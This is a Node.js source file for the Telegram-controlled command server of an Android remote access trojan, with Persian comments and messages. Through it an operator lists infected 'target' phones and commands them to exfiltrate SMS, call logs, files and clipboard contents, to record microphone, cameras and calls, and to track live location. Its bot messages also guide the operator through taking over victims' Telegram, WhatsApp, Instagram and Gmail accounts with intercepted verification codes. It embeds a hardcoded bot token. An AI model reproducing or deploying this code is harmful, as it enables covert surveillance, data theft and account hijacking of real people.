const express    = require('express');
const webSocket  = require('ws');
const http       = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4      = require('uuid');
const multer     = require('multer');
const bodyParser = require('body-parser');
const axios      = require('axios');

// ═══════════════════════════════════════════════════════════════
//  CONFIG
// ═══════════════════════════════════════════════════════════════
const token   = process.env.BOT_TOKEN     || '8620686668:AAF51hqMQqlUDvHtRFkMxsNn5awhJ5vFzrk';
const id      = process.env.ADMIN_CHAT_ID || '8364030252';
const address = 'https://www.google.com';

// مدت زمان انتظار قبل از ارسال اعلان قطع اتصال (میلی‌ثانیه)
// اگه دستگاه در این مدت دوباره وصل بشه → اعلان قطع ارسال نمیشه
const GRACE_PERIOD_MS   = 15_000;  // 15 ثانیه

// بازه ارسال ping برای چک زنده بودن اتصال
const PING_INTERVAL_MS  = 25_000;  // هر 25 ثانیه

// ═══════════════════════════════════════════════════════════════
//  INIT
// ═══════════════════════════════════════════════════════════════
const app        = express();
const appServer  = http.createServer(app);
const appSocket  = new webSocket.Server({ server: appServer });
const appBot     = new telegramBot(token, { polling: true });

// دستگاه‌های متصل: uuid → { model, battery, version, brightness, provider, fingerprint }
const appClients = new Map();

// دستگاه‌های که تازه قطع شدن و در حال انتظار ری‌کانکت هستن
// fingerprint → { model, battery, version, brightness, provider, timer }
const pendingDisconnects = new Map();

const upload = multer();
app.use(bodyParser.json());

// ═══════════════════════════════════════════════════════════════
//  STATE (جایگزین ۳ متغیر global که race condition داشتن)
// ═══════════════════════════════════════════════════════════════
const state = { uuid: '', number: '', title: '' };

// ═══════════════════════════════════════════════════════════════
//  ERROR BOUNDARY (بدون این هر crash کل سرور رو میکشت)
// ═══════════════════════════════════════════════════════════════
process.on('uncaughtException',  err    => console.error('[uncaughtException]',  new Date().toISOString(), err));
process.on('unhandledRejection', reason => console.error('[unhandledRejection]', new Date().toISOString(), reason));

// ═══════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════

// یک fingerprint یکتا از مشخصات دستگاه میسازه برای شناسایی ری‌کانکت
function getFingerprint(model, provider, version) {
    return `${model}|${provider}|${version}`;
}

// ws.send ایمن با چک readyState
function safeSend(ws, data) {
    if (ws.readyState === webSocket.OPEN) {
        try { ws.send(data); }
        catch (e) { console.error('[ws.send]', e.message); }
    }
}

// ارسال دستور به دستگاه خاص بر اساس UUID
function sendToDevice(uuid, message) {
    appSocket.clients.forEach(ws => {
        if (ws.uuid === uuid) safeSend(ws, message);
    });
}

// کیبورد اصلی ربات
const mainKeyboard = {
    parse_mode: "HTML",
    reply_markup: {
        keyboard: [["تارگت ها"], ["پنل دسترسی"]],
        resize_keyboard: true
    }
};
const processingMsg = '• درخواست شما در حال انجام است\n\n• در چند لحظه آینده پاسخی دریافت خواهید کرد';

// ═══════════════════════════════════════════════════════════════
//  HTTP ROUTES
// ═══════════════════════════════════════════════════════════════

app.get('/', (req, res) => {
    res.send('<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WebHook Status</title><style>body {font-family: Arial, sans-serif;text-align: center;background-color: #f4f4f4;padding: 20px;}h1 {font-size: 36px;margin-bottom: 20px;}.status-container {display: flex;justify-content: center;align-items: center;margin-top: 20px;}.status-container div {margin: 10px;font-size: 18px;}.status-container .left {text-align: left;}.status-container .right {text-align: right;}.status-container .right span {color: #00FF00;font-weight: bold;}.button {padding: 10px 20px;font-size: 18px;background-color: #00FF00;color: white;border: none;cursor: pointer;margin-top: 20px;}.ok-sticker {display: inline-block;width: 20px;height: 20px;background-color: #00FF00;border-radius: 50%;text-align: center;vertical-align: middle;font-size: 16px;color: white;line-height: 20px;margin-left: 10px;}</style></head><body><h1>Welcome To WebHook</h1><div class="status-container"><div class="left"><p>Domain:</p><p>Status:</p><p>Ip Login:</p></div><div class="right"><p><span>https://Shayan.com/</span></p><p>Online <span class="ok-sticker">✔</span></p><p>192.168.1.1</p></div></div><a href="t.me/lllZM"><button class="button">Contact Support</button></a>');
});

// اندپوینت برای آپلود فایل از دستگاه
app.post('/uploadFile', upload.single('file'), (req, res) => {
    if (!req.file) {
        console.error('[uploadFile] No file received');
        return res.status(400).send('No file uploaded');
    }
    appBot.sendDocument(
        id,
        req.file.buffer,
        {
            caption: `• پیام و گزارش دریافت شده از دستگاه : <b>${req.headers.model || 'نامشخص'}</b>\n            📍CR :〔 MAHYAR 〕`,
            parse_mode: "HTML"
        },
        {
            filename: req.file.originalname,
            contentType: 'application/octet-stream'   // قبلاً 'application/txt' بود که MIME نامعتبره
        }
    ).catch(e => console.error('[sendDocument]', e.message));
    res.send('');
});

// ─── اندپوینت وضعیت سرور (برای دستگاه‌ها) ───────────────────
// دستگاه بعد از قطع اینترنت میتونه این endpointرو poll کنه
// تا بفهمه سرور آنلاینه و باید ری‌کانکت کنه
app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        timestamp: Date.now(),
        connected: appClients.size,
        reconnect: true   // دستگاه باید WebSocket رو reconnect کنه
    });
});

// ═══════════════════════════════════════════════════════════════
//  WEBSOCKET — اتصال دستگاه‌ها
// ═══════════════════════════════════════════════════════════════

appSocket.on('connection', (ws, req) => {
    const model       = req.headers.model      || 'نامشخص';
    const battery     = req.headers.battery    || '?';
    const version     = req.headers.version    || '?';
    const brightness  = req.headers.brightness || '?';
    const provider    = req.headers.provider   || '?';
    const fingerprint = getFingerprint(model, provider, version);

    // ── چک ری‌کانکت: آیا همین دستگاه قبلاً متصل بود و تازه قطع شده؟ ──
    const pending = pendingDisconnects.get(fingerprint);
    const isReconnect = !!pending;

    if (pending) {
        // لغو تایمر اعلان قطع اتصال — دستگاه در مهلت مقرر برگشت
        clearTimeout(pending.timer);
        pendingDisconnects.delete(fingerprint);
    }

    const uuid  = uuid4.v4();
    ws.uuid        = uuid;
    ws.fingerprint = fingerprint;
    ws.isAlive     = true;   // برای سیستم ping/pong

    appClients.set(uuid, { model, battery, version, brightness, provider, fingerprint });

    if (isReconnect) {
        // اتصال مجدد: فقط یک پیام کوتاه (بدون اطلاعات کامل)
        appBot.sendMessage(id,
            `• اتصال مجدد دستگاه 🔄\n\n` +
            `• مدل دستگاه : <b>${model}</b>\n` +
            `• باتری : <b>${battery}</b>\n` +
            `• اپراتور : <b>${provider}</b>`,
            { parse_mode: "HTML" }
        ).catch(e => console.error('[sendMessage]', e.message));
    } else {
        // اتصال جدید: پیام کامل
        appBot.sendMessage(id,
            `• دستگاه جدید متصل شد ✅\n\n` +
            `• مدل دستگاه : <b>${model}</b>\n` +
            `• باتری : <b>${battery}</b>\n` +
            `• نسخه اندروید : <b>${version}</b>\n` +
            `• پردازش سی پی یو : <b>${brightness}</b>\n` +
            `• اپراتور : <b>${provider}</b>`,
            { parse_mode: "HTML" }
        ).catch(e => console.error('[sendMessage]', e.message));
    }

    // ── دریافت پیام از دستگاه ──
    ws.on('message', rawMsg => {
        const msg = rawMsg.toString();
        // پاسخ text-pong از دستگاه (اگه native pong پشتیبانی نمیشه)
        if (msg === 'pong' || msg === 'ping') {
            ws.isAlive = true;
            return;
        }
        // سایر پیام‌ها لاگ میشن (برای debug)
        console.log('[device msg]', model, '→', msg.substring(0, 200));
    });

    // ── native WebSocket pong (از ws.ping() ──
    ws.on('pong', () => { ws.isAlive = true; });

    // ── قطع اتصال ──
    ws.on('close', () => {
        appClients.delete(uuid);

        // ── GRACE PERIOD: منتظر میمونیم — شاید دستگاه سریع ری‌کانکت کنه ──
        // این مشکل "disconnect بعد از location" رو حل میکنه
        const timer = setTimeout(() => {
            // اگه در مهلت مقرر برنگشت → اعلان واقعی قطع اتصال
            pendingDisconnects.delete(fingerprint);
            appBot.sendMessage(id,
                `• قطع اتصال دستگاه ❌\n\n` +
                `• مدل دستگاه : <b>${model}</b>\n` +
                `• باتری : <b>${battery}</b>\n` +
                `• نسخه اندروید : <b>${version}</b>\n` +
                `• پردازش سی پی یو : <b>${brightness}</b>\n` +
                `• اپراتور : <b>${provider}</b>`,
                { parse_mode: "HTML" }
            ).catch(e => console.error('[sendMessage]', e.message));
        }, GRACE_PERIOD_MS);

        pendingDisconnects.set(fingerprint, {
            model, battery, version, brightness, provider, timer
        });
    });

    ws.on('error', err => {
        console.error('[ws client error]', model, uuid, err.message);
    });
});

// ═══════════════════════════════════════════════════════════════
//  PING / HEARTBEAT — تشخیص اتصالات مرده
// ═══════════════════════════════════════════════════════════════
setInterval(() => {
    appSocket.clients.forEach(ws => {
        if (!ws.isAlive) {
            // دستگاه به ping جواب نداده → اتصال را قطع کن
            // این باعث میشه 'close' event بیفته → grace period شروع بشه
            console.log('[heartbeat] dead connection terminated:', ws.fingerprint);
            ws.terminate();
            return;
        }
        ws.isAlive = false;
        ws.ping();             // native WebSocket ping
        safeSend(ws, 'ping'); // text ping (برای app‌هایی که native pong نمیفرستن)
    });

    // keep-alive برای خود سرور
    axios.get(address).catch(() => {});
}, PING_INTERVAL_MS);

// ═══════════════════════════════════════════════════════════════
//  BOT: پیام‌های متنی
// ═══════════════════════════════════════════════════════════════
appBot.on('message', message => {
    const chatId  = String(message.chat.id);
    const msgText = message.text || '';   // پیام‌های غیرمتنی (عکس، استیکر) undefined میشه

    // ── پردازش reply‌ها ──
    if (message.reply_to_message) {
        const replyText = message.reply_to_message.text || ''; // reply به عکس → undefined بود

        if (replyText.includes('• لطفا به شماره ای که می خواهید پیامک را به آن ارسال کنید بفرستید')) {
            state.number = msgText;
            appBot.sendMessage(id,
                '• عالی، حالا پیامی را که می خواهید به این شماره ارسال کنید وارد کنید\n\n' +
                '• مراقب باشید اگر تعداد کاراکترهای پیام شما بیش از حد مجاز باشد، پیام ارسال نمیشود',
                { reply_markup: { force_reply: true } }
            ).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• عالی، حالا پیامی را که می خواهید به این شماره ارسال کنید وارد کنید')) {
            sendToDevice(state.uuid, `send_message:${state.number}/${msgText}`);
            state.number = '';
            state.uuid   = '';
            appBot.sendMessage(id, processingMsg, mainKeyboard).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• پیامی را که می خواهید به همه مخاطبین ارسال کنید وارد کنید')) {
            sendToDevice(state.uuid, `send_message_to_all:${msgText}`);
            state.uuid = '';
            appBot.sendMessage(id, processingMsg, mainKeyboard).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• مسیر فایلی را که می خواهید دانلود کنید وارد کنید')) {
            sendToDevice(state.uuid, `file:${msgText}`);
            state.uuid = '';
            appBot.sendMessage(id, processingMsg, mainKeyboard).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• مسیر فایلی را که می خواهید حذف کنید وارد کنید')) {
            sendToDevice(state.uuid, `delete_file:${msgText}`);
            state.uuid = '';
            appBot.sendMessage(id, processingMsg, mainKeyboard).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• مدت زمان ضبط میکروفون را وارد کنید')) {
            sendToDevice(state.uuid, `microphone:${msgText}`);
            state.uuid = '';
            appBot.sendMessage(id, processingMsg, mainKeyboard).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• مدت زمانی که می خواهید دوربین عقب ضبط شود را وارد کنید')) {
            sendToDevice(state.uuid, `rec_camera_main:${msgText}`);
            state.uuid = '';
            appBot.sendMessage(id, processingMsg, mainKeyboard).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• مدت زمانی که می خواهید دوربین سلفی ضبط شود را وارد کنید')) {
            sendToDevice(state.uuid, `rec_camera_selfie:${msgText}`);
            state.uuid = '';
            appBot.sendMessage(id, processingMsg, mainKeyboard).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• پیامی را وارد کنید که می خواهید بر روی دستگاه تارگت ظاهر شود')) {
            sendToDevice(state.uuid, `toast:${msgText}`);
            state.uuid = '';
            appBot.sendMessage(id, processingMsg, mainKeyboard).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• پیامی را که می خواهید به عنوان اعلان نمایش داده شود وارد کنید')) {
            state.title = msgText;
            appBot.sendMessage(id,
                '• عالی، اکنون لینکی را که می خواهید با اعلان باز شود وارد کنید\n\n' +
                '• وقتی تارگت روی اعلان کلیک می کند، پیوندی که وارد می کنید باز می شود',
                { reply_markup: { force_reply: true } }
            ).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• عالی، اکنون لینکی را که می خواهید با اعلان باز شود وارد کنید')) {
            sendToDevice(state.uuid, `show_notification:${state.title}/${msgText}`);
            state.uuid  = '';
            state.title = '';
            appBot.sendMessage(id, processingMsg, mainKeyboard).catch(e => console.error('[sendMessage]', e.message));
        }

        if (replyText.includes('• لینک صوتی مورد نظر برای پخش را وارد کنید')) {
            sendToDevice(state.uuid, `play_audio:${msgText}`);
            state.uuid = '';
            appBot.sendMessage(id, processingMsg, mainKeyboard).catch(e => console.error('[sendMessage]', e.message));
        }
    }

    // ── پیام‌های ادمین ──
    if (id === chatId) {
        if (msgText === '/start') {
            appBot.sendMessage(id,
                '• به پنل رت خوش آمدید\n\n' +
                '• اگر برنامه بر روی دستگاه مورد نظر نصب شده است، منتظر اتصال باشید\n\n' +
                '• هنگامی که پیام اتصال را دریافت می کنید، به این معنی است که دستگاه مورد نظر متصل و آماده دریافت فرمان است\n\n' +
                '• روی دکمه پنل دسترسی کلیک کنید و دستگاه مورد نظر را انتخاب کنید سپس از بین دستورات دستور مورد نظر را انتخاب کنید\n\n' +
                '• اگر در جایی از ربات گیر کردید، دستور /start را ارسال کنید\n\n' +
                '• My Channel: 〔@MvahyaR〕',
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["تارگت ها"], ["پنل دسترسی"]],
                        resize_keyboard: true
                    }
                }
            ).catch(e => console.error('[sendMessage]', e.message));
        }

        if (msgText === 'تارگت ها') {
            if (appClients.size === 0) {
                appBot.sendMessage(id,
                    '• هیچ دستگاه اتصالی موجود نیست\n\n' +
                    '• اطمینان حاصل کنید که برنامه بر روی دستگاه مورد نظر نصب شده است'
                ).catch(e => console.error('[sendMessage]', e.message));
            } else {
                let listText = '• فهرست دستگاه های متصل:\n\n';
                appClients.forEach(v => {
                    listText +=
                        `• مدل دستگاه : <b>${v.model}</b>\n` +
                        `• باتری : <b>${v.battery}</b>\n` +
                        `• نسخه اندروید : <b>${v.version}</b>\n` +
                        `• روشنایی صفحه نمایش : <b>${v.brightness}</b>\n` +
                        `• اپراتور : <b>${v.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, listText, { parse_mode: "HTML" })
                    .catch(e => console.error('[sendMessage]', e.message));
            }
        }

        if (msgText === 'پنل دسترسی') {
            if (appClients.size === 0) {
                appBot.sendMessage(id,
                    '• هیچ دستگاه اتصالی موجود نیست\n\n' +
                    '• اطمینان حاصل کنید که برنامه بر روی دستگاه مورد نظر نصب شده است'
                ).catch(e => console.error('[sendMessage]', e.message));
            } else {
                const keyboard = [];
                appClients.forEach((v, k) => {
                    keyboard.push([{ text: v.model, callback_data: 'device:' + k }]);
                });
                appBot.sendMessage(id, '• برای اجرای دستور دستگاه مورد نظر را انتخاب کنید', {
                    reply_markup: { inline_keyboard: keyboard }
                }).catch(e => console.error('[sendMessage]', e.message));
            }
        }
    } else {
        appBot.sendMessage(chatId, '• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
            .catch(e => console.error('[sendMessage]', e.message));
    }
});

// ═══════════════════════════════════════════════════════════════
//  BOT: Callback Queries
// ═══════════════════════════════════════════════════════════════
appBot.on('callback_query', callbackQuery => {
    const msg  = callbackQuery.message;
    const data = callbackQuery.data;

    // split فقط روی اولین ':' (UUID حاوی '-' است نه ':')
    const colonIdx = data.indexOf(':');
    const command  = colonIdx !== -1 ? data.slice(0, colonIdx) : data;
    const uuid     = colonIdx !== -1 ? data.slice(colonIdx + 1) : '';

    // پاک کردن loading spinner دکمه‌ها (در نسخه اصلی فراموش شده بود)
    appBot.answerCallbackQuery(callbackQuery.id).catch(() => {});

    // ── نمایش پنل دستورات دستگاه ──
    if (command === 'device') {
        const device = appClients.get(uuid);
        if (!device) {
            appBot.sendMessage(id, '• ❌ دستگاه مورد نظر دیگر متصل نیست\n• لطفاً «پنل دسترسی» را دوباره باز کنید')
                .catch(e => console.error('[sendMessage]', e.message));
            return;
        }

        appBot.editMessageText(
            `• دستور را برای اجرا در دستگاه انتخاب کنید : <b>${device.model}</b>`,
            {
                chat_id:    id,
                message_id: msg.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'وضعیت : 🟢',                  callback_data: 'text' },
                            { text: 'شناسه : 🆎',                   callback_data: 'text' }
                        ],
                        [{ text: '────────────────────',           callback_data: 'text' }],
                        [
                            { text: 'دریافت پیام ✉️',               callback_data: `messages:${uuid}` },
                            { text: 'ارسال پیام 📝',                callback_data: `send_message:${uuid}` }
                        ],
                        [
                            { text: 'تماس ها 📞',                   callback_data: `calls:${uuid}` },
                            { text: 'ضبط تماس 🎤',                  callback_data: `calls_record:${uuid}` }
                        ],
                        [
                            { text: 'عکس دوربین عقب 📷',           callback_data: `camera_main:${uuid}` },
                            { text: 'عکس دوربین جلو 📷',           callback_data: `camera_selfie:${uuid}` }
                        ],
                        [
                            { text: 'فیلم دوربین عقب 🎬',          callback_data: `video_camera_main:${uuid}` },
                            { text: 'فیلم دوربین جلو 🎬',          callback_data: `video_camera_selfie:${uuid}` }
                        ],
                        [
                            { text: 'لوکیشن 📌',                    callback_data: `location:${uuid}` },
                            { text: 'لایو لوکیشن 📍',               callback_data: `live_location:${uuid}` }
                        ],
                        [
                            { text: 'میکروفون 🎙️',                  callback_data: `microphone:${uuid}` },
                            { text: 'شنود لایو 📟',                 callback_data: `live_audio:${uuid}` }
                        ],
                        [
                            { text: 'دریافت فایل 📁',               callback_data: `file:${uuid}` },
                            { text: 'حذف فایل 🗑️',                 callback_data: `delete_file:${uuid}` }
                        ],
                        [
                            { text: 'نمایش اعلان 🔔',              callback_data: `show_notification:${uuid}` },
                            { text: 'نمایش پیام 📝',                callback_data: `toast:${uuid}` }
                        ],
                        [
                            { text: 'پخش صدا 🔊',                  callback_data: `play_audio:${uuid}` },
                            { text: 'توقف صدا ⏹️',                 callback_data: `stop_audio:${uuid}` }
                        ],
                        [
                            { text: 'لرزش 📳',                     callback_data: `vibrate:${uuid}` },
                            { text: 'کلیپ بورد 📋',                callback_data: `clipboard:${uuid}` }
                        ],
                        [
                            { text: 'تلگرام 🔵',                    callback_data: `telegram:${uuid}` },
                            { text: 'اینستاگرام 🟣',                callback_data: `instagram:${uuid}` }
                        ],
                        [
                            { text: 'جیمیل ⚪',                     callback_data: `gmail:${uuid}` },
                            { text: 'واتساپ 🟢',                   callback_data: `whatsapp:${uuid}` }
                        ],
                        [
                            { text: '📲 ارسال پیام همگانی به مخاطبین 📝', callback_data: `send_message_to_all:${uuid}` }
                        ]
                    ]
                }
            }
        ).catch(e => console.error('[editMessageText]', e.message));
        return;
    }

    // ── دستوراتی که مستقیم به دستگاه ارسال میشن ──
    const DIRECT = {
        calls:           'calls',
        contacts:        'contacts',
        messages:        'messages',
        apps:            'apps',
        device_info:     'device_info',
        camera_main:     'camera_main',
        camera_selfie:   'camera_selfie',
        location:        'location',
        live_location:   'live_location',
        live_audio:      'live_audio',
        calls_record:    'calls_record',
        vibrate:         'vibrate',
        stop_audio:      'stop_audio',
        clipboard:       'clipboard',
        telegram:        'telegram',
        whatsapp:        'whatsapp',
        instagram:       'instagram',
        gmail:           'gmail'
    };

    const SPECIAL_MSG = {
        telegram:  'ارور لاگ 403 ! ⚠️ \n • راهنما : شما میتوانید در پلتفرم تلگرام 🔵 با استفاده از کد ارسال به شماره تارگت وارد اکانت شخص بشید و این کد کاملا بصورت اتوماتیک از دیوایس فرد دریافت شده و بصورت اتوماتیک برای شما ارسال شده و میتوانید براحتی وارد اکانت فرد  بشید ! \n\n شماره تارگت را در لحظه ورود . وارد کنید : \n روی گزینه ارسال کد تایید از شماره موبایل را بزنید \n سپس منتظر باشید تا کد ورود از طریق ربات به شما ارسال بشه بصورت کاملا اتومات!• برای چند لحظه ای دستگاه تارگت قطع اتصال و سپس متصل میشود !',
        whatsapp:  'ارور لاگ 403 ! ⚠️ \n • راهنما : شما میتوانید در پلتفرم واتساپ 🟢 با  استفاده از کد ارسال به شماره تارگت وارد اکانت شخص بشید و این کد کاملا بصورت اتوماتیک از دیوایس فرد دریافت شده و بصورت اتوماتیک برای شما ارسال شده و میتوانید براحتی وارد اکانت فرد  بشید ! \n\n شماره تارگت را در لحظه ورود . وارد کنید : \n روی گزینه ارسال کد تایید از شماره موبایل را بزنید \n سپس منتظر باشید تا کد ورود از طریق ربات به شما ارسال بشه بصورت کاملا اتومات !• برای چند لحظه ای دستگاه تارگت قطع اتصال و سپس متصل میشود !',
        instagram: 'ارور لاگ 403 ! ⚠️ \n • راهنما : شما میتوانید در پلتفرم اینستاگرام 🟣 با  استفاده از کد ارسال به شماره حساب تارگت وارد اکانت شخص بشید و این کد کاملا بصورت اتوماتیک از دیوایس فرد دریافت شده و بصورت اتوماتیک برای شما ارسال شده و میتوانید براحتی وارد اکانت فرد  بشید ! \n\n در قسمت ورود به حساب اینستاگرام روی گزینه فراموش کردن رمزعبور بزنید ! \n شماره موبایل تارگت را بزنید \n سپس منتظر باشید تا کد ورود از طریق ربات به شما ارسال بشه !• برای چند لحظه ای دستگاه تارگت قطع اتصال و سپس متصل میشود !',
        gmail:     'ارور لاگ 403  در بارگزاری اطلاعات ! ⚠️ \n • راهنما : شما میتوانید در پلتفرم جیمیل ⚪ با  استفاده از کد ارسال به شماره حساب جیمیل تارگت وارد حساب  شخص بشید و این کد کاملا بصورت اتوماتیک از دیوایس فرد دریافت شده و بصورت اتوماتیک برای شما ارسال شده و میتوانید براحتی وارد اکانت فرد  بشید ! \n\n در قسمت ورود به حساب جیمیل روی گزینه فراموش کردن رمزعبور بزنید ! \n شماره موبایل تارگت را بزنید \n سپس منتظر باشید تا کد ورود از طریق ربات به شما ارسال بشه !• برای چند لحظه ای دستگاه تارگت قطع اتصال و سپس متصل میشود !'
    };

    if (DIRECT.hasOwnProperty(command)) {
        sendToDevice(uuid, DIRECT[command]);
        appBot.deleteMessage(id, msg.message_id).catch(() => {});
        appBot.sendMessage(id, SPECIAL_MSG[command] || processingMsg, mainKeyboard)
            .catch(e => console.error('[sendMessage]', e.message));
        return;
    }

    // ── دستوراتی که نیاز به ورودی اضافه دارن ──
    const inputCommands = {
        send_message: {
            prompt: '• لطفا به شماره ای که می خواهید پیامک را به آن ارسال کنید بفرستید\n\n• اگر می خواهید به شماره کشور محلی پیامک ارسال کنید با صفر در ابتدا، در غیر این صورت شماره را با کد کشور وارد کنید.',
            opts: { reply_markup: { force_reply: true } }
        },
        send_message_to_all: {
            prompt: '• پیامی را که می خواهید به همه مخاطبین ارسال کنید وارد کنید\n\n• مراقب باشید اگر تعداد کاراکترهای پیام شما بیش از حد مجاز باشد، پیام ارسال نمیشود',
            opts: { reply_markup: { force_reply: true } }
        },
        file: {
            prompt: '• مسیر فایلی را که می خواهید دانلود کنید وارد کنید\n\n• نیازی به وارد کردن مسیر فایل کامل نیست، کافیست مسیر اصلی را وارد کنید.  برای مثال وارد کنید<b> DCIM/Camera </b> برای دریافت فایل های گالری.',
            opts: { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        },
        delete_file: {
            prompt: '• مسیر فایلی را که می خواهید حذف کنید وارد کنید\n\n• نیازی به وارد کردن مسیر فایل کامل نیست، کافیست مسیر اصلی را وارد کنید.  برای مثال وارد کنید<b> DCIM/Camera </b> برای حذف فایل های گالری.',
            opts: { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        },
        microphone: {
            prompt: '• مدت زمان ضبط میکروفون را وارد کنید\n\n• توجه داشته باشید که باید زمان را به صورت عددی بر حسب واحد ثانیه وارد کنید',
            opts: { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        },
        video_camera_main: {
            prompt: '• مدت زمانی که می خواهید دوربین عقب ضبط شود را وارد کنید\n\n• توجه داشته باشید که باید زمان را به صورت عددی بر حسب واحد ثانیه وارد کنید',
            opts: { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        },
        video_camera_selfie: {
            prompt: '• مدت زمانی که می خواهید دوربین سلفی ضبط شود را وارد کنید\n\n• توجه داشته باشید که باید زمان را به صورت عددی بر حسب واحد ثانیه وارد کنید',
            opts: { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        },
        toast: {
            prompt: '• پیامی را وارد کنید که می خواهید بر روی دستگاه تارگت ظاهر شود\n\n• نان تست پیام کوتاهی است که برای چند ثانیه روی صفحه نمایش دستگاه ظاهر می شود',
            opts: { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        },
        show_notification: {
            prompt: '• پیامی را که می خواهید به عنوان اعلان نمایش داده شود وارد کنید\n\n• پیام شما مانند اعلان معمولی در نوار وضعیت دستگاه مورد نظر ظاهر می شود',
            opts: { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        },
        play_audio: {
            prompt: '• لینک صوتی مورد نظر برای پخش را وارد کنید\n\n• توجه داشته باشید که باید لینک مستقیم صدای مورد نظر را وارد کنید در غیر این صورت صدا پخش نمی شود',
            opts: { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        }
    };

    if (inputCommands.hasOwnProperty(command)) {
        appBot.deleteMessage(id, msg.message_id).catch(() => {});
        appBot.sendMessage(id, inputCommands[command].prompt, inputCommands[command].opts)
            .catch(e => console.error('[sendMessage]', e.message));
        state.uuid = uuid;
        return;
    }

    // command === 'text' (دکمه‌های تزئینی) → answerCallbackQuery بالا کافیه
});

// ═══════════════════════════════════════════════════════════════
//  START SERVER
// ═══════════════════════════════════════════════════════════════
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`[server] Started on port ${PORT} — ${new Date().toISOString()}`);
});
